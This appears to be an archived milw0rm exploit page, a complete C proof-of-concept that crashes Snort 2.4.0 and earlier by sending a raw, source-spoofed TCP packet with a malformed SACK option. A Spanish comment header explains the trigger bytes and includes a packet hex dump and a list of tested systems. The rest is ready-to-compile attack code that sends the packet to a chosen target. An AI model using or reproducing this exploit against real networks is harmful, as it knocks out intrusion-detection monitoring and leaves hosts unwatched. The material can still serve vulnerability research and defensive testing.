<html>
<head>
<title>Snort <= 2.4.0 SACK TCP Option Error Handling Denial of Service Exploit</title>
<pre>

/*_------------------------------------------_
 ||------+ Snort &lt;= 2.4.0 Trigger p0c +------||
 ||__________________________________________||
 ||--=[ nitrous [at] vulnfact [dot] com  ]=--||
 ||--=[      VulnFact Security Labs      ]=--||
 ||--=[           21 Ago 2oo5            ]=--||
 ||--=[              Mexico              ]=--||
 ||__________________________________________||
 -__________________________________________-

 Snort &lt;= 2.4.0 SACK TCP Option Error Handling
 Este cÛdigo envia al  especificado un paquete TCP/IP con 4 bytes extras
 correspondientes al campo TCP Options [TCP Header].
 Estos 4 bytes son &quot;\x05\x02\x00\x00&quot;. NOTA !!!: Snort solamente cae cuando se
 esta corriendo en verbose mode (-v).

 Esto solo funciona testeando de una maquina a otra directamente conectadas
 (1 solo salto; Ej. En una red LAN de PC a PC). No funciona desde Internet, por
 que el campo TCP-&gt;th_sum es 0 (cero), por lo tanto, el primer Router por donde
 pase este paquete lo descartara por no tener una checksum valida.

 RFC #1072 - TCP Extensions for Long-Delay Paths

 3.2- TCP SACK Option:
     ...
     Kind: 5
     Length: Variable
     +--------+--------+--------+--------+--------+--------+
     | Kind=5 | Length | Relative Origin |   Block Size    |
     +--------+--------+--------+--------+--------+--------+

 Analizando el packete con 'tcpdump' en OpenBSD 3.5 vemos:
 11:17:53.093264 ip: 127.0.0.1.29383 &gt; 127.0.0.1.80: S 213975407:213975407(0) win 5840
 &lt;malformed sack [len 0] ,eol&gt;
 0000: 4500 002c bc4f 0000 ff06 017a 7f00 0001  E..,≈íO..√ø..z....
 0010: 7f00 0001 72c7 0050 0cc1 016f 43f1 8422  ....r√á.P.√Å.oC√±.&quot;
 0020: 6002 16d0 3caf 0000 0502 0000            `..√ê&lt;¬Ø......

 Testeado en:
 [+] snort 2.4.0 @ OpenBSD 3.7 GENERIC // Yeah ;)
 [+] snort 2.4.0 @ Ubuntu Linux 5.04 &quot;Hoary Hedgehog&quot;
 [+] snort 2.3.2 @ Debian Linux 3.1 &quot;Sarge&quot;
 [+] snort 2.3.0 @ Ubuntu Linux 5.04 &quot;Hoary Hedgehog&quot;
 [+] snort 2.3.0 @ Red Hat Linux 9
 [+] snort 2.2.0 @ Ubuntu Linux 5.04 &quot;Hoary Hedgehog&quot;
 [+] snort 2.0.0 @ OpenBSD 3.5 GENERIC

 Saludos a vulnfact.com, CRAc, stacked, ran, dex, benn, beck, zlotan, Rowter, Gus, Crypkey,
 protoloco, Falckon, dymitri, #cum ppl, warlord/nologin.org por fuzzball2 fuzzer, gcarrillog,
 JSS, y en especial a Mariit@ ( Sexy Colombiana ;) ). A la musica de &quot;Sussie 4&quot; ;)...
 Federico L. Bossi Bonin
*/

#include&lt;stdio.h&gt;
#include&lt;string.h&gt;
#include&lt;unistd.h&gt;
#include&lt;errno.h&gt;
#include&lt;netdb.h&gt;
#include&lt;sys/types.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;netinet/in.h&gt;
//#define __USE_BSD     1       /* Use BSD's ip header style */
#include&lt;netinet/ip.h&gt;
#define __FAVOR_BSD     1       /* Use BSD's tcp header style */
#include&lt;netinet/tcp.h&gt;

#define IPSIZE  sizeof(struct ip)
#define TCPSIZE sizeof(struct tcphdr)
#define DEFAULT_SRC_IP  &quot;200.31.33.70&quot;

char trigger[] = &quot;\x05\x02\x00\x00&quot;; /* Malformed SACK TCP Option */

int usage(char *name)
{
       fprintf(stderr, &quot;Usage: %s &lt;target&gt; [spoofed srcip]\n&quot;, name);
       fprintf(stderr, &quot;\t\tDefault srcip = %s\n&quot;, DEFAULT_SRC_IP);

       return 0;
}

int main(int argc, char **argv)
{
       char *packet= (char *) malloc(IPSIZE + TCPSIZE + 4);
       char *srcip = DEFAULT_SRC_IP;
       int sockfd, count;
       int one = 1; /* setsockopt() */
       struct sockaddr_in target;
       struct hostent *host2ip;
       struct ip *IP = (struct ip *) packet;
       struct tcphdr *TCP = (struct tcphdr *) (packet + IPSIZE);

       if(argc &lt; 2)
               return(usage(*argv));

       if(argc == 3)
               srcip = argv[2];

       if((host2ip = gethostbyname(argv[1])) == NULL){
               perror(&quot;gethostbyname&quot;);
               exit(-1);
       }

       if(getuid() != 0){
               fprintf(stderr, &quot;Ups!, must be r00t to perform RAW sockets\n&quot;);
               exit(-1);
       }

       memset(packet, 0x00, sizeof(packet));

       memset(&amp;target, 0x00, sizeof(target));
       target.sin_family       = AF_INET;
       target.sin_port         = htons(64876);
       target.sin_addr         = *((struct in_addr *)host2ip-&gt;h_addr);

       /*** BUILDING MALFORMED PACKET ***/
       IP-&gt;ip_hl       = 0x05;
       IP-&gt;ip_v        = 0x04;
       IP-&gt;ip_tos      = 0x00;
       IP-&gt;ip_len      = IPSIZE + TCPSIZE + 4;
       IP-&gt;ip_id       = 0x00;
       IP-&gt;ip_off      = 0x00;
       IP-&gt;ip_ttl      = 0xff;
       IP-&gt;ip_p        = IPPROTO_TCP;
       IP-&gt;ip_sum      = 0x00;
       IP-&gt;ip_src.s_addr = inet_addr(srcip);
       IP-&gt;ip_dst.s_addr = target.sin_addr.s_addr;

       TCP-&gt;th_sport   = htons(31337);
       TCP-&gt;th_dport   = target.sin_port;
       TCP-&gt;th_seq     = 0x00;
       TCP-&gt;th_ack     = 0x00;
       TCP-&gt;th_x2      = 0x00;
       TCP-&gt;th_off     = 0x06;
       TCP-&gt;th_flags   = 0x00; /* NO Syn ;) */
       TCP-&gt;th_win     = htons(0xffff);
       TCP-&gt;th_sum     = 0x00;
       TCP-&gt;th_urp     = 0x00;

       memcpy(packet + IPSIZE + TCPSIZE, trigger, 4);
       /*** END ***/

       if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == -1){
               perror(&quot;socket&quot;);
               exit(-1);
       }

       if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &amp;one, sizeof(one)) == -1){
               perror(&quot;setsockopt&quot;);
               exit(-1);
       }

       printf(&quot;-=[ Snort &lt;= 2.4.0 Trigger p0c\n&quot;);
       printf(&quot;-=[ By nitr0us &lt;nitrous[at]vulnfact[dot]com&gt;\n\n&quot;);
       printf(&quot;-=[ Sending Malformed TCP/IP Packet...\n&quot;);

       if((count = sendto(sockfd, packet, IP-&gt;ip_len, 0, (struct sockaddr *)&amp;target, sizeof(target))) == -1){
               perror(&quot;sendto&quot;);
               close(sockfd);
               exit(-1);
       }

       printf(&quot;-=[ Sent %d bytes to %s\n&quot;, count, argv[1]);
       printf(&quot;-=[ Snort killed !\n&quot;);

       close(sockfd);
       return 0;
}

// milw0rm.com [2005-09-12]
</pre>
</html>

